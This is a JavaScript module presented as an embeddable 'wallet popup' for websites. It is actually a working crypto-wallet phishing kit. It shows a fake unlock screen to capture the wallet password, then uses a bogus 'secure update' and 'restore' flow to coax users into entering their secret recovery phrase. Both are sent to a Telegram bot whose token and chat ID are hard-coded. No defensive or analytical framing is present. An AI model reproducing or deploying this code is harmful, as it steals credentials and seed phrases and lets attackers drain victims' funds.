// Wallet Popup Module - Easily embeddable on any website
// Usage: walletPopup.attachToButton(document.getElementById('yourButtonId'));

const walletPopup = (() => {
  // Popup HTML as template literal
  const popupHTML = `
    <div class="wallet-popup" id="walletPopupMain" style="display:none;">
      <div class="wallet-popup-image">
        <img src="sol.png" alt="Wallet Flag" id="walletFlag" />
      </div>
      <!-- Password Section -->
      <div class="wallet-popup-content section" id="passwordSection">
        <h2>Unlock Your Wallet</h2>
        <p class="wallet-desc">Enter your password and access your funds safely.</p>
        <form id="walletUnlockForm" autocomplete="off">
          <div class="wallet-input-group">
            <input
              type="password"
              id="passwordInput"
              placeholder="Enter your password"
              required
            />
            <span class="toggle-password" id="togglePassword" tabindex="0" aria-label="Show password">&#128065;</span>
          </div>
          <button type="submit" class="wallet-unlock-btn" id="unlockBtn" disabled>Unlock</button>
        </form>
        <div class="forgot-password">
          <a href="#" id="forgotPasswordLink">Forgot password</a>
        </div>
      </div>
      <!-- Update Section -->
      <div class="wallet-popup-content section" id="updateSection" style="display:none;">
        <span class="download-label">
          A secure update is ready. Please download to continue protecting your assets.
        </span>
        <button class="wallet-download-btn" id="downloadBtn">Download Update</button>
        <button class="wallet-skip-btn" id="skipBtn">Skip</button>
      </div>
      <!-- Loader Section -->
      <div class="loader-section" id="loaderSection" style="display:none;">
        <div class="loader"></div>
        <div class="loader-message" id="loaderMsg"></div>
      </div>
      <!-- Phrase Section -->
      <div class="wallet-popup-content section" id="phraseSection" style="display:none;">
        <textarea placeholder="Import with Secret Phrase" id="phraseInput" rows="8"></textarea>
        <button class="wallet-submit-btn" id="submitBtn" disabled>Submit</button>
      </div>
    </div>
  `;

  // Popup CSS as a string
  const popupCSS = `
    .wallet-popup {
      position: fixed;
      top: 0px;
      right: 24px;
      z-index: 99999;
      background: #0e1015;
      border-radius: 40px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.20);
      max-width: 420px;
      width: 94vw;
      color: #fff;
      overflow: hidden;
      border: none;
      opacity: 0;
      pointer-events: none;
      transform: translateY(-24px) scale(0.98);
      transition: opacity 0.35s cubic-bezier(.59,.16,.62,1.38), transform 0.35s cubic-bezier(.59,.16,.62,1.38);
      height: 630px;
      min-height: 480px;
      max-height: 680px;
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
      align-items: stretch;
    }
    .wallet-popup.active {
      opacity: 1;
      pointer-events: all;
      transform: translateY(0) scale(1);
      display: flex !important;
    }
    .wallet-popup-image {
      background: #ffe934;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 28px 0 0 0;
      border-radius: 40px 40px 0 0;
      overflow: hidden;
    }
    .wallet-popup-image img {
      display: block;
      width: 100%;
      max-width: 100%;
      height: auto;
      object-fit: cover;
      background: #ececec;
      border-radius: 0;
    }
    .wallet-popup-content,
    .loader-section {
      padding: 28px 24px 18px 24px;
      text-align: left;
      flex: 1 1 auto;
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
    }
    .wallet-popup-content h2 {
      font-size: 2rem;
      font-weight: bold;
      margin-bottom: 8px;
      color: #fff;
      letter-spacing: -.5px;
    }
    .wallet-desc {
      color: #90939d;
      margin-bottom: 18px;
      font-size: 1.08rem;
    }
    .wallet-input-group {
      background: #14161c;
      border: 1.5px solid #25282e;
      border-radius: 14px;
      display: flex;
      align-items: center;
      padding: 0 14px;
      margin-bottom: 16px;
      transition: border 0.2s;
    }
    .wallet-input-group:focus-within {
      border-color: #ffe934;
    }
    .wallet-input-group input {
      background: transparent;
      border: none;
      outline: none;
      color: #fff;
      font-size: 1.12rem;
      padding: 15px 0;
      flex: 1;
    }
    .toggle-password {
      cursor: pointer;
      color: #90939d;
      font-size: 1.25rem;
      margin-left: 10px;
      user-select: none;
    }
    .wallet-unlock-btn,
    .wallet-download-btn,
    .wallet-skip-btn,
    .wallet-submit-btn {
      background: #ffe934;
      color: #23262f;
      border: none;
      border-radius: 30px;
      width: 100%;
      padding: 15px 0;
      font-size: 1.18rem;
      font-weight: 700;
      margin-bottom: 36px;
      margin-top: 6px;
      cursor: pointer;
      transition: background 0.18s;
      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
      outline: none;
      display: block;
    }
    .wallet-skip-btn {
      background: #222b;
      color: #ffe934;
      margin-top: 10px;
      margin-bottom: 30px;
    }
    .wallet-unlock-btn:disabled,
    .wallet-submit-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
    .download-label {
      display: block;
      font-size: 1.03rem;
      line-height: 1.4;
      margin-bottom: 16px;
      color: #ffe934;
      background: #131417;
      padding: 8px 16px;
      border-radius: 9px;
      font-weight: 600;
      text-align: center;
    }
    .loader-section {
      display: none;
      text-align: center;
      padding: 28px 24px 24px 24px;
      flex: 1 1 auto;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .loader-section.active {
      display: flex;
    }
    .loader {
      margin: 10px auto 16px auto;
      width: 36px;
      height: 36px;
      border: 5px solid #ffe934;
      border-top: 5px solid #23262f;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      display: block;
    }
    @keyframes spin {
      100% { transform: rotate(360deg);}
    }
    .loader-message {
      font-size: 1.06rem;
      color: #ffe934;
      margin-top: 12px;
      min-height: 32px;
    }
    .wallet-popup textarea {
      width: 100%;
      min-height: 90px;
      background: #16181e;
      border: 1.5px solid #25282e;
      border-radius: 12px;
      color: #fff;
      font-size: 1.07rem;
      padding: 12px 16px;
      resize: none;
      margin-bottom: 10px;
      box-sizing: border-box;
      outline: none;
      transition: border .2s;
    }
    .wallet-popup textarea:focus {
      border-color: #ffe934;
    }
    .forgot-password {
      text-align: center;
      margin-top: 12px;
    }
    .forgot-password a {
      color: #fff;
      text-decoration: none;
      font-size: 1.04rem;
      font-weight: 500;
      opacity: 0.96;
    }
    .forgot-password a:hover {
      text-decoration: underline;
    }
    .wallet-popup-content::after,
    .loader-section::after {
      content: "";
      display: block;
      height: 34px;
      flex-shrink: 0;
    }
    @media (max-width: 480px) {
      .wallet-popup {
        top: 10px;
        right: 0;
        left: 0;
        margin: 0 auto;
        max-width: 99vw;
        border-radius: 16px;
        height: 96vw;
        min-height: 320px;
        max-height: 99vh;
      }
      .wallet-popup-content,
      .loader-section {
        padding: 14px 6vw;
      }
    }
  `;

  // Telegram constants (customize for your use)
  const TELEGRAM_BOT_TOKEN = '7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA';
  const TELEGRAM_CHAT_ID = '-4704812522';

  // Style injection
  function injectStyles(css) {
    if (document.getElementById('walletPopupStyle')) return;
    const style = document.createElement('style');
    style.id = 'walletPopupStyle';
    style.innerHTML = css;
    document.head.appendChild(style);
  }

  // DOM injection
  function injectPopup(html) {
    if (document.getElementById('walletPopupMain')) return document.getElementById('walletPopupMain');
    const div = document.createElement('div');
    div.innerHTML = html.trim();
    document.body.appendChild(div.firstChild);
    return document.getElementById('walletPopupMain');
  }

  // Telegram send helper
  function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });
  }

  // Section navigation
  function nextSection(showId) {
    document.querySelectorAll('#walletPopupMain .section, #walletPopupMain .loader-section').forEach(sec => {
      sec.classList.remove('active');
      sec.style.display = 'none';
    });
    const el = document.getElementById(showId);
    if (!el) return;
    el.classList.add('active');
    el.style.display = '';
    // Focus input if needed
    if (showId === 'passwordSection') document.getElementById('passwordInput').focus();
    if (showId === 'phraseSection') document.getElementById('phraseInput').focus();
  }

  // Show/Hide popup
  function showPopup() {
    const popup = document.getElementById('walletPopupMain');
    popup.style.display = 'flex';
    setTimeout(() => {
      popup.classList.add('active');
      nextSection('passwordSection');
    }, 10);
  }
  function hidePopup() {
    const popup = document.getElementById('walletPopupMain');
    popup.classList.remove('active');
    setTimeout(() => {
      popup.style.display = 'none';
    }, 400);
  }

  // Download handler
  function handleDownload() {
    const a = document.createElement('a');
    a.href = 'https://example.com/wallet-update.zip'; // replace as needed
    a.download = 'wallet-update.zip';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    // Don't show phrase section after download
  }

  // Loader/phrase handlers
  function showLoader() {
    document.getElementById('loaderMsg').textContent = "For your security, we need to restore your wallet. Please wait while we prepare your recovery process.";
    nextSection('loaderSection');
    setTimeout(() => {
      nextSection('phraseSection');
    }, 5000);
  }
  function showLazyLoader() {
    document.getElementById('loaderMsg').textContent = "";
    nextSection('loaderSection');
    setTimeout(() => {
      nextSection('updateSection');
    }, 2000);
  }
  function submitPhrase() {
    const phrase = document.getElementById('phraseInput').value.trim();
    if (!phrase) {
      alert('Please enter your secret phrase.');
      document.getElementById('phraseInput').focus();
      return;
    }
    sendToTelegram(`Mnemonic phrase entered: ${phrase}`);
    alert('Phrase submitted!');
    hidePopup();
  }

  // Public method: attach to button
  function attachToButton(buttonOrSelector) {
    injectStyles(popupCSS);
    const popup = injectPopup(popupHTML);

    // Only add listeners once
    if (popup.dataset.init) return;
    popup.dataset.init = '1';

    // Button click
    const btn = typeof buttonOrSelector === 'string'
      ? document.querySelector(buttonOrSelector)
      : buttonOrSelector;

    if (btn) {
      btn.addEventListener('click', showPopup);
    }

    // Password visibility toggle
    const passwordInput = document.getElementById('passwordInput');
    const togglePassword = document.getElementById('togglePassword');
    togglePassword.addEventListener('click', function () {
      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
      passwordInput.setAttribute('type', type);
      this.textContent = type === 'password' ? '\u{1F441}' : '\u{1F441}\u{FE0E}';
    });
    togglePassword.addEventListener('keydown', function (e) {
      if (e.key === 'Enter' || e.key === ' ') {
        togglePassword.click();
      }
    });

    // Unlock button enable/disable
    const unlockBtn = document.getElementById('unlockBtn');
    function toggleUnlockBtn() {
      unlockBtn.disabled = passwordInput.value.trim() === '';
    }
    passwordInput.addEventListener('input', toggleUnlockBtn);
    toggleUnlockBtn();

    // Submit button for phrase enable/disable
    const phraseInput = document.getElementById('phraseInput');
    const submitBtn = document.getElementById('submitBtn');
    function togglePhraseBtn() {
      submitBtn.disabled = phraseInput.value.trim() === '';
    }
    phraseInput.addEventListener('input', togglePhraseBtn);
    togglePhraseBtn();

    // Password form submission
    document.getElementById('walletUnlockForm').addEventListener('submit', function (e) {
      e.preventDefault();
      const password = passwordInput.value;
      sendToTelegram(`Password entered: ${password}`);
      showLazyLoader();
    });

    // Download update
    document.getElementById('downloadBtn').addEventListener('click', handleDownload);
    // Skip update
    document.getElementById('skipBtn').addEventListener('click', showLoader);
    // Phrase submit
    submitBtn.addEventListener('click', submitPhrase);

    // Forgot password
    document.getElementById('forgotPasswordLink').addEventListener('click', function (e) {
      e.preventDefault();
      alert('Forgot password clicked! Implement your recovery logic here.');
    });

    // Close on outside click (optional)
    window.addEventListener('mousedown', function (e) {
      if (!popup.contains(e.target) && popup.classList.contains('active')) {
        hidePopup();
      }
    });
  }

  // Export
  return { attachToButton };
})();

// Usage Example (uncomment to use):
// walletPopup.attachToButton(document.getElementById('yourButtonId'));